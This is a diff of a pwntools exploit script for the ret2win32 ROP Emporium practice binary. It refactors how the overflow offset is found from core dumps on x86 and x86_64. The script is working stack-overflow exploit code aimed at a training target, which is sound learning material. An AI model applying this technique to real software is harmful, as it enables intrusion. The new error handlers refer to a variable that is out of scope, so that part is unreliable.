@@ -11,7 +11,7 @@
 
 import os           # Provides a way of using operating system dependent functionalities
 import re           # Allows pattern matching and text processing through regex
-from pwn import *   # Import Python3 library for accessing operating system functionality
+from pwn import *   # Import CTF framework and exploit development library
 
 def exploit(binary_path):
 
@@ -29,7 +29,7 @@ def exploit(binary_path):
         log.debug(f"The address of ret2win() is {hex(ret2win_addr)}")
 
         # Get the offset by calling the find_offset() function
-        offset = find_offset(binary_path)
+        offset = find_offset(elf)
         log.debug(f"The offset calculated to overwrite EIP is {offset} bytes")
 
         # Construct the payload
@@ -44,18 +44,17 @@ def exploit(binary_path):
         output = io.clean().decode()
         log.info(output)
 
-        # Use regular expression to search for the flag pattern
-        flag_pattern = r'ROPE{[^}]+}'
-        match = re.search(flag_pattern, output)
+def find_cyclic_pattern(io):
 
-        # Verify if the ROP exploit was successful in capturing the flag 
-        if match:
-            flag = match.group(0)
-            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
-        else:
-            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")
+    # Generate and send a cyclic pattern as input to the binary
+    pattern = cyclic(144)
+    io.sendline(pattern)
+    io.wait()
 
-def find_offset(binary_path):
+    # Return the core file
+    return io.corefile
+
+def find_offset(elf):
 
     # Save the original log level which would be either 'info' or 'debug'
     log_level = context.log_level
@@ -63,47 +62,53 @@ def find_offset(binary_path):
     # Disable logging for offset calculations
     context.log_level = 'error'
 
-    # Record a memory crash in the Core_Dumps subdirectory
+     # Record a memory crash in the Core_Dumps subdirectory
     try:
 
-        # Create an ELF object and start a new process
-        elf = context.binary = ELF(binary_path)
-        
+        # Create a directory called 'Core_Dumps' if it does not already exist
+        if not os.path.exists('Core_Dumps'):
+            os.makedirs('Core_Dumps')
+
         # Automatically close the process when the "with" block is exited
         with process(elf.path) as io:
 
-            # Send a cyclic pattern as input to the binary
-            pattern = cyclic(69)
-            io.sendline(pattern)
-            io.wait()           
+            # If the architecture is x86, calculate the offset to overwrite eip
+            if context.arch == 'i386':
+                core = find_cyclic_pattern(io)
+                offset = cyclic_find(p32(core.eip), n=4)
 
-            # Get the corefile to extract the value of the instruction pointer (eip)
-            core = io.corefile
-            eip = core.eip
-
-            # Find the offset by searching for the cyclic pattern in the eip value
-            offset = cyclic_find(p32(eip), n=4)
+            # If the architecture is x86_64, calculate the offset to overwrite rip
+            elif context.arch == 'amd64':
+                core = find_cyclic_pattern(io)
+                rip = core.rip
+                offset = cyclic_find(core.read(core.rsp, 4))
 
             # Revert the log level to the original value
             context.log_level = log_level
+
+        # Move all files with the pattern 'core.*' or just 'core' to the 'Core_Dumps' directory
+        for filename in os.listdir('.'):
+            if filename.startswith('core.') or filename == 'core':
+                os.rename(filename, os.path.join('Core_Dumps', filename))
+
+
+        # Output the calculated offset for debugging purposes
+        log.debug(f"The offset calculated to overwrite the instruction pointer is {offset} bytes")
 
         # Return the calculated offset to overwrite the instruction pointer
         return offset
 
     except FileNotFoundError as e:
-        log.error(f"Binary not found at {binary_path}")
+        log.error(f"Error: Binary file not found at {binary_path}")
         raise e
-
     except PermissionError as e:
-        log.error(f"You do not have permission to access {binary_path}")
+        log.error(f"Error: You do not have permission to access {binary_path}")
         raise e
-
     except ValueError as e:
-        log.error(f"Unable to find cyclic pattern in instruction pointer")
+        log.error(f"Error: Unable to find cyclic pattern in core dump")
         raise e
-
     except Exception as e:
-        log.error(f"An error occurred while finding offset")
+        log.error(f"Error: An unexpected error occurred while finding the offset")
         raise e
 
 if __name__ == '__main__':
@@ -111,13 +116,6 @@ if __name__ == '__main__':
     # Initiate the executables name to declare a valid filesystem path
     binary_path = './ret2win32'
     warnings.filterwarnings("ignore", category=BytesWarning)
+
+    # Perform the exploitation on the specified binary
     exploit(binary_path)
-
-    # Create a directory called 'core' if it does not already exist
-    if not os.path.exists('Core_Dumps'):
-        os.makedirs('Core_Dumps')
-
-    # Move all files with the pattern 'core.*' to the 'core' directory
-    for filename in os.listdir('.'):
-        if filename.startswith('core.'):
-            os.rename(filename, os.path.join('Core_Dumps', filename))
